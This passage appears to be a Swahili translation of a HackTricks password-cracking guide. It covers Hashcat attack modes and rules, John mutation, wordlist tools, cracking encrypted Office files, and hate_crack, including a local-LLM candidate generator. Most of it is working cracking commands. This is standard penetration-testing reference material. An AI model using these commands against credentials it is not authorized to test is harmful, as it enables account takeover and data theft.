# From https://github.com/Ridter/p12tool
./p12tool crack -c staff.pfx -f /usr/share/wordlists/rockyou.txt
# From https://github.com/crackpkcs12/crackpkcs12
crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
```

## Zana

**Mifano ya hash:** [https://openwall.info/wiki/john/sample-hashes](https://openwall.info/wiki/john/sample-hashes)

### Hash-identifier

```bash
hash-identifier
> <HASH>
```

### Wordlists

- **Rockyou**
- [**Probable-Wordlists**](https://github.com/berzerk0/Probable-Wordlists)
- [**Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/wordlists)
- [**Seclists - Passwords**](https://github.com/danielmiessler/SecLists/tree/master/Passwords)

### **Zana za Kutengeneza Wordlists**

- [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** Jenereta ya hali ya juu ya keyboard-walk yenye herufi za msingi, keymap na njia zinazoweza kusanidiwa.

```bash
kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
```

### John mutation

Soma _**/etc/john/john.conf**_ na uisanidi

```bash
john --wordlist=words.txt --rules --stdout > w_mutated.txt
john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
```

### Hashcat

#### Hashcat attacks

- **Wordlist attack** (`-a 0`) kwa rules

**Hashcat** tayari huja na **folda iliyo na rules**, lakini unaweza kupata [**rules nyingine za kuvutia hapa**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).

```
hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
```

#### Eleza na kuchanganua faili za rules

Hashcat rules hutekeleza opcodes kutoka kushoto kwenda kulia. Hili ni rahisi kulielewa vibaya shughuli zinapotumika kwenye nafasi ya sifuri: `^e ^h ^t` huweka `e` mwanzoni, kisha `h`, halafu `t`, na hivyo kubadilisha `password` kuwa `thepassword`. Ubadilishaji hulinganisha byte kwa kuzingatia herufi kubwa na ndogo, kwa hiyo rule kama `sa@` haifanyi chochote kwa `A` kubwa. Jaribu rules usizozifahamu dhidi ya basewords zenye herufi ndogo, herufi kubwa na mchanganyiko wa herufi kabla ya kutumia muda wa GPU kuzichakata.<sup>[[6]](#references)[[9]](#references)</sup>

[HashcatRosetta](https://github.com/bandrel/HashcatRosetta) inaweza kuonyesha kila candidate ya kati na kutoa muhtasari wa usambazaji wa opcodes katika faili zima la rules. Idadi tuli ya opcodes huonyesha ikiwa faili kwa kiasi kikubwa huongeza herufi mwishoni, mwanzoni, hubadilisha herufi au huzikata. Hazithibitishi kwamba rule itapata nenosiri, lakini husaidia kuchagua seti ya rules inayolingana na mifumo ya nenosiri iliyoonekana katika kundi lengwa.<sup>[[6]](#references)[[9]](#references)</sup>

```bash
uv tool install git+https://github.com/bandrel/HashcatRosetta.git
hashcat-rosetta --explain '^e ^h ^t' --baseword password
hashcat-rosetta rules.rule --analyze-rules
```

#### Punguza sheria zinazojirudia kwa kutumia logi za debug

Hali ya debug ya Hashcat hurekodi mabadiliko ya rule kando na matokeo ya kawaida ya hali na matokeo. Hali `4` huandika `baseword:rule:candidate`; hali `5` huongeza source wordlist. Weka `--debug-file` wazi kila wakati. Vinginevyo, Hashcat hufungua `hashcat.debugfile` kwenye saraka yake ya profile, na kuelekeza stdout kunasa mtiririko wa console badala ya rekodi hizi. Faili za debug hufunguliwa katika hali ya kuongezea, kwa hiyo futa au zungusha faili ya zamani kabla ya kipimo kipya na ilinde kwa sababu ina basewords na candidates katika maandishi wazi.<sup>[[7]](#references)[[8]](#references)[[9]](#references)</sup>

```bash
rm -f debug.txt
hashcat -m 1000 -a 0 --debug-mode 5 --debug-file debug.txt \
  -r rules.rule hashes.txt wordlist.txt
hashcat-rosetta debug.txt --rules --metric candidates --top 25
hashcat-rosetta debug.txt --basewords --detail
hashcat-rosetta debug.txt --wordlists --detail
hashcat-rosetta debug.txt --export report.json --format json
```

Tumia `frequency` kupata rules zinazotumika mara nyingi zaidi, `basewords` kupima idadi ya inputs tofauti zinazofunikwa, na `candidates` kuhesabu outputs tofauti. Kupanga candidates kwa ubora kwa kawaida ndiyo hatua bora ya kuanzia unapopunguza rules, kwa sababu rule inayotumika mara nyingi bado inaweza kuunganisha inputs nyingi kwenye candidates zinazojirudia. Nakili rules zenye thamani ya juu zaidi kwenye faili dogo, kisha endesha tena dhidi ya hashes zilizobaki na ulinganishe ripoti za kila run. Mode `5` pia huonyesha kama kila source wordlist inachangia basewords zenye manufaa; lazimisha uchanganuzi kwa kutumia `--debug-mode 4` au `--debug-mode 5` wakati koloni kwenye data zinafanya utambuzi wa kiotomatiki usiwe wazi.<sup>[[6]](#references)[[9]](#references)</sup>

- **Wordlist combinator** attack

Inawezekana **kuunganisha wordlists 2 kuwa 1** kwa kutumia hashcat.\
Ikiwa list 1 ina neno **"hello"** na ya pili ina mistari 2 yenye maneno **"world"** na **"earth"**, maneno `helloworld` na `helloearth` yatatengenezwa.

```bash
# This will combine 2 wordlists
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt

# Same attack as before but adding chars in the newly generated words
# In the previous example this will generate:
## hello-world!
## hello-earth!
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt -j $- -k $!
```

#### Mashambulizi ya combinator yanayoongozwa na sarufi (mfano wa Office iliyosimbwa kwa njia fiche)

Nenosiri linaweza kuwa refu na kuwa na aina kadhaa za herufi, lakini bado likawa na **nafasi finyu ya utafutaji inayotumika** ikiwa linafuata sarufi inayojulikana. Kwa hati ya Office iliyosimbwa kwa njia fiche iliyopatikana wakati wa tathmini iliyoidhinishwa, `office2john.py` hutoa rekodi ya uthibitishaji wa nenosiri; hii huwezesha majaribio ya kubashiri nenosiri ndani ya kifaa bila kufungiwa nje, kupunguziwa kasi au kuhitaji MFA.<sup>[[2]](#references)[[5]](#references)</sup>

Ondoa sehemu ya jina la faili ambayo John huongeza ili Hashcat ipokee verifier pekee:<sup>[[2]](#references)</sup>

```bash
python3 /path/to/office2john.py secrets.xlsx | sed 's/^[^:]*://' > office.hash
head -c 40 office.hash; echo
```

Chagua `-m` kulingana na kiambishi awali kilichotolewa, si kiendelezi cha faili. Hashcat huweka `$office$*2007*`, `$office$*2010*`, na `$office$*2013*` katika modes `9400`, `9500`, na `9600`; rekodi za zamani za `$oldoffice$0/$1` na `$oldoffice$3/$4` hutumia modes `9700` na `9800`, mtawalia.<sup>[[3]](#references)</sup>

Ikiwa taarifa kuhusu matumizi ya nenosiri tena, sera, vidokezo, au watu wanaomfahamu mtumiaji zinaonyesha muundo wa kanuni kama `<word><number><optional !><word>`, tengeneza kamusi ya kushoto kutokana na kiambishi awali kinachoweza kuorodheshwa kivyake. Mfano huu hujaribu nambari `0` hadi `99`; badilisha masafa na mabadiliko kulingana na ushahidi kutoka kwenye tathmini.<sup>[[5]](#references)</sup>

```bash
while IFS= read -r word; do
  for number in $(seq 0 99); do
    printf '%s%s\n%s%s!\n' "$word" "$number" "$word" "$number"
  done
done < words.txt > wordsAndNumbers.txt
```

Hashcat attack mode `1` huambatisha kila mstari wa dictionary ya kulia kwenye kila mstari wa dictionary ya kushoto, kwa hivyo faili zenye mistari `L` na `R` hutoa wagombea `L × R` kabla ya rules zozote kutumika. Amri ifuatayo imekusudiwa mahususi kwa rekodi ya zamani ya `$oldoffice$3/$4`; badilisha mode kwa miundo mingine ya Office.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

```bash
hashcat -m 9800 -a 1 office.hash wordsAndNumbers.txt english-88k-upper.txt
```

Mchoro huu wa uchakataji wa awali unaweza kutumika kwa miundo mingine inayoweza kuthibitishwa bila mtandao: tengeneza orodha ya herufi kubwa au ndogo, tarehe, vitenganishi, tarakimu au alama za uakifishaji zinazowezekana tu kwa kipengele kimoja, kisha kiunganishe na kipengele kingine badala ya kujaribu kwa nguvu urefu wote wa kinadharia.<sup>[[4]](#references)[[5]](#references)</sup>

- **Shambulio la Mask** (`-a 3`)

```bash
# Mask attack with simple mask
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt ?u?l?l?l?l?l?l?l?d

hashcat --help #will show the charsets and are as follows
? | Charset
===+=========
l | abcdefghijklmnopqrstuvwxyz
u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
d | 0123456789
h | 0123456789abcdef
H | 0123456789ABCDEF
s | !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
a | ?l?u?d?s
b | 0x00 - 0xff

# Mask attack declaring custom charset
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt -1 ?d?s ?u?l?l?l?l?l?l?l?1
## -1 ?d?s defines a custom charset (digits and specials).
## ?u?l?l?l?l?l?l?l?1 is the mask, where "?1" is the custom charset.

# Mask attack with variable password length
## Create a file called masks.hcmask with this content:
?d?s,?u?l?l?l?l?1
?d?s,?u?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?l?1
## Use it to crack the password
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt .\masks.hcmask
```

#### Thibitisha faili za `.hcmask` kabla ya kuendesha

Mstari wenye hitilafu unaweza kupuuzwa kati ya masks halali, kwa hiyo thibitisha faili lote na makadirio ya keyspace yake kabla ya kuanzisha shambulio. HashcatRosetta huripoti mstari wenye hitilafu na kurudisha hali isiyo sifuri ikiwa mask yoyote si halali, hivyo ukaguzi huu unafaa kwa scripts au CI.<sup>[[6]](#references)[[9]](#references)</sup>

```bash
hashcat-rosetta masks.hcmask --verify-masks
```

Usinormalize mask files kwa kutumia CSV au text parsers za jumla. Hashcat hutumia charsets maalum `?1` hadi `?8`, huchukulia `#` kuwa comment pale tu inapokuwa byte ya kwanza, na huondoa backslash escapes kwa hatua moja kabla ya kutafsiri tokens za `?`. Kwa hiyo, whitespace kabla ya `#` huwa mask data, na escaping inaweza kubadilisha ikiwa mfuatano utachukuliwa kama literal au charset token.<sup>[[6]](#references)[[9]](#references)</sup>

- Wordlist + Mask (`-a 6`) / Mask + Wordlist (`-a 7`) attack

```bash
# Mask numbers will be appended to each word in the wordlist
hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d

# Mask numbers will be prepended to each word in the wordlist
hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
```

#### Hashcat passes zilizofunzwa kwa target kwa kutumia hate_crack

[hate_crack](https://github.com/trustedsec/hate_crack) huratibu Hashcat passes za ndani baada ya kuwa na faili la hash na kujua mode yake ya Hashcat. Hashcat yenyewe lazima isakinishwe kando. Clone pamoja na submodules, endesha `make`, kisha anzisha session shirikishi; mode ya mfano `1000` ni ya NTLM, si default ya kila hali. Clone zilizopo zinahitaji `git submodule update --init --recursive` kabla ya kutumia chaguo za PCFG na PRINCE-LING.<sup>[[13]](#references)[[14]](#references)</sup>

```bash
git clone --recurse-submodules https://github.com/trustedsec/hate_crack.git
cd hate_crack
make
hate_crack hashes.txt 1000
```

**Jifunze grammar kutokana na plaintexts zilizorejeshwa.** Endesha hatua ya awali ya dictionary/rule, kisha ifunze `pcfg_cracker` kwa kutumia plaintexts zinazohusiana na lengo. Weka `pcfgRuleset` katika `config.json` iwe ruleset iliyofunzwa, kisha uchague PCFG (menu `20`) ili kutuma miundo inayowezekana kwa Hashcat, au PRINCE-LING (`21`) ili kuunda orodha ya msingi ya PRINCE inayoongozwa na grammar. Weka vikomo vya jenereta hizo mbili kwa kutumia `pcfgMaxCandidates` na `pcfgPrinceLingMaxCandidates`; hate_crack haikufunzi grammar kwa niaba yako. PCFG hujifunza uwezekano wa miundo kama vile baseword ikifuatiwa na tarakimu na alama, tofauti na grammar isiyobadilika katika [combinator example](#grammar-driven-combinator-attacks-encrypted-office-example).<sup>[[10]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
cd pcfg_cracker
python3 trainer.py -t ../target-plaintexts.txt -r TARGET
cd ..
# Set pcfgRuleset to TARGET in config.json, then select 20 or 21.
hate_crack hashes.txt 1000
```

**Chimba rules kwa kurudi nyuma kutoka kwenye passwords zinazojulikana.** Spoonman (menu `22`) hutumia korpasi ya plaintext, ikijumuisha faili ya `.out` isiyo tupu ya session ya sasa, na kutoa basewords za herufi ndogo pamoja na Hashcat rules zinazounda upya passwords zilizozingatiwa. Hupanga rules kulingana na idadi ya passwords za korpasi zinazoweza kuzalishwa nazo. Anza na kiwango cha rules kinachofunika 50% ya passwords, kisha panua tu ikiwa keyspace ya ziada ina msingi wa kutosha; changanya basewords zilizotolewa na wordlists nyingine zinazofaa pale ambapo stem inayokosekana, badala ya mutation, ndiyo inayopunguza coverage. Hashcat hukubali hadi functions 31 kwa rule na alfabeti yake ya nafasi hushughulikia indices `0`–`35` pekee; Spoonman hutumia baseword halisi na rule isiyobadilisha chochote pale ambapo password haiwezi kuwakilishwa. Korpasi kubwa sana zinaweza kufikia kikomo cha counter ya memory iliyowekewa bounds, kwa hiyo angalia coverage iliyoripotiwa badala ya kudhani kuwa reconstruction imekamilika. Angalia [tabia ya Hashcat rule](#explain-and-profile-rule-files) kabla ya kutumia matokeo kivyake.<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>

**Chagua generator kulingana na ushahidi uliopo.** OMEN (`13`) hufunza modeli ya mabadiliko ya herufi kutoka kwenye orodha ya passwords na kutoa candidates kwa mpangilio wa uwezekano, huku idadi yake ikiwa na kikomo cha `omenMaxCandidates`. Markov brute force (`15`) badala yake inaweza kujenga jedwali la `.hcstat2` kutoka kwenye cracks za `.out` za sasa au orodha iliyochaguliwa, kisha kujaribu range ya urefu ya incremental. Wakati taarifa kuhusu lengo ni maandishi badala ya passwords, N-gram (`16`) huingiza korpasi, ikijumuisha ingizo la gzip, kwenye `ngramX.bin`; ukubwa wake chaguomsingi wa kundi ni tatu. Hizi ni mbadala, si nakala tatu za orodha ileile ya candidates.<sup>[[11]](#references)[[13]](#references)[[14]](#references)</sup>

**Panua pool ndogo na zinazowezekana tu.** Permutation (`17`) hupanga upya kila herufi katika kila neno la ingizo, kwa hiyo hata neno moja lenye herufi nane huzalisha mipangilio `8!`. Combipow (`19`) hutoa combinations za subsets zisizo tupu kutoka kwenye pool fupi ya maneno ya passphrase; `-s` huingiza nafasi na tool hukataa zaidi ya mistari 63 ya ingizo. Combinator (`6`) inaweza kuunganisha wordlists nyingi kwa separators kupitia `--sepFill`; uunganishaji wa kawaida wa wordlists mbili unashughulikiwa na [Hashcat combinator ya asili](#hashcat-attacks) hapo juu.<sup>[[13]](#references)[[14]](#references)</sup>

**Panga bajeti ya feedback attacks.** Fingerprint (`5`) hupanua passwords mpya zilizocrackiwa kwa hatua, kwa kutumia urefu wa vipande unaoongezeka, badala ya kupanua upya korpasi nzima kila raundi; kizingiti cha keyspace ya combinations huruka pass ya `-a 1` inapokuwa kubwa kupita kiasi. Hybrid (`7`) hujaribu kwanza mapambo ya gharama nafuu ya `?s?d` kabla ya masks pana zaidi za kuambatisha `?a` mwanzoni au mwishoni, huku `hcatHybridMaxRuntime` ikiweka kikomo cha muda wa run. Hili ni muhimu kwa sababu gharama ya hybrid pass ni ukubwa wa wordlist ukizidishwa kwa mask space, kwa hiyo mask pana dhidi ya orodha kubwa inaweza kuzidi kwa mbali passes za mwanzo.<sup>[[13]](#references)[[14]](#references)</sup>

**Tengeneza candidates kutoka kwenye passwords zilizorejeshwa kwa kutumia LLM ya ndani.** Baada ya pass ya mwanzo kutoa `<hashfile>.out` isiyo tupu, LLM attack ya hate_crack (main menu `12`, submenu ya **Cracked passwords** `3`) inaweza kukisia basewords, miaka, suffixes, na matumizi ya herufi kubwa na ndogo mahususi kwa lengo, kisha kuwasilisha candidates mpya kwa Hashcat. Korpasi ndogo zinaweza kujumuisha plaintexts zilizorejeshwa kwenye prompt ya modeli; korpasi kubwa zaidi badala yake hufupishwa kuwa takwimu. Mbinu hii hujumlisha desturi zilizozingatiwa badala ya kurudia tu [rules](#explain-and-profile-rule-files) au [masks](#hashcat-attacks) zisizobadilika zilizo hapo juu.<sup>[[13]](#references)[[14]](#references)</sup>

Sanidi modeli ya Ollama ya ndani ambayo tayari inahudumia maombi ndani ya `.env` ya hate_crack; modeli haipakuliwi yenyewe. `OLLAMA_NO_CLOUD=true` hukataa modeli zenye tag ya cloud na anwani za endpoint za nje ya mtandao wako. Endpoint ya localhost pekee haitoshi: Ollama inaweza kupeleka modeli ya `-cloud` kwa mbali, na prompts zinaweza kuwa na plaintexts zilizorejeshwa au takwimu za korpasi. Mpangilio huu bado unaruhusu endpoints za private network na hauwezi kuondoa uwezekano wa transport proxy, kwa hiyo hakiki njia ya inference kabla ya kutuma data ya mteja.<sup>[[13]](#references)[[14]](#references)[[15]](#references)</sup>

```dotenv
LLM_BACKEND=ollama
OLLAMA_HOST=localhost:11434
OLLAMA_MODEL=qwen3:4b-instruct
OLLAMA_NO_CLOUD=true
```

```bash
hate_crack hashes.txt 1000
# Select 12 (LLM Attack), then 3 (Cracked passwords).
```

Linganisha idadi ya makadirio yanayofaa na majaribio ya gharama nafuu zaidi kwa kutumia rules, masks na passes zilizofunzwa kwa target kabla ya kuongeza bajeti. Model hutengeneza makadirio; Hashcat bado huyajaribu dhidi ya hashes.<sup>[[13]](#references)[[14]](#references)</sup>

#### Modi za Hashcat

```bash
hashcat --example-hashes | grep -B1 -A2 "NTLM"
```

Cracking Hashes za Linux - faili ya /etc/shadow

```
 500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
```

Cracking Windows Hashes

```
3000 | LM                                               | Operating-Systems
1000 | NTLM                                             | Operating-Systems
```

Kupasua Hash za Kawaida za Programu

```
  900 | MD4                                              | Raw Hash
    0 | MD5                                              | Raw Hash
 5100 | Half MD5                                         | Raw Hash
  100 | SHA1                                             | Raw Hash
10800 | SHA-384                                          | Raw Hash
 1400 | SHA-256                                          | Raw Hash
 1700 | SHA-512                                          | Raw Hash
```

## References

- [1] [Ndani ya GoBruteforcer: defaults za server zilizotengenezwa na AI, passwords dhaifu, na kampeni zinazolenga crypto](https://research.checkpoint.com/2026/inside-gobruteforcer-ai-generated-server-defaults-weak-passwords-and-crypto-focused-campaigns/)
- [2] [John the Ripper: `office2john.py`](https://github.com/openwall/john/blob/bleeding-jumbo/run/office2john.py)
- [3] [Hashcat hashes za mfano na modes za Microsoft Office](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [4] [Hashcat combinator attack](https://hashcat.net/wiki/doku.php?id=combinator_attack)
- [5] [Mipango ya urithi wa credentials](https://pentestpartners.com/security-blog/estate-planning-of-credentials)
- [6] [Repository ya HashcatRosetta](https://github.com/bandrel/HashcatRosetta)
- [7] [Utekelezaji wa debug-file wa Hashcat](https://github.com/hashcat/hashcat/blob/master/src/debugfile.c)
- [8] [Msaada wa mstari wa amri wa Hashcat](https://github.com/hashcat/hashcat/blob/master/docs/hashcat-help.md)
- [9] [HashcatRosetta: Kusoma Jiwe la Rosetta la Password Cracking](https://trustedsec.com/blog/hashcatrosetta-reading-the-rosetta-stone-of-password-cracking)
- [10] [Repository na matumizi ya PCFG Cracker](https://github.com/lakiw/pcfg_cracker)
- [11] [Repository na mwongozo wa mtumiaji wa OMEN](https://github.com/RUB-SysSec/OMEN)
- [12] [Issue asilia ya Spoonman na muundo wa derivation ya rules](https://github.com/trustedsec/hate_crack/issues/169)
- [13] [Repository ya hate_crack na nyaraka za attacks](https://github.com/trustedsec/hate_crack)
- [14] [Mambo mapya katika hate_crack tangu 2.0](https://trustedsec.com/blog/whats-new-in-hate-crack-since-2-0)
- [15] [Sera ya hate_crack kuhusu destination ya LLM](https://github.com/trustedsec/hate_crack/blob/main/hate_crack/llm.py)
{{#include ../banners/hacktricks-training.md}}
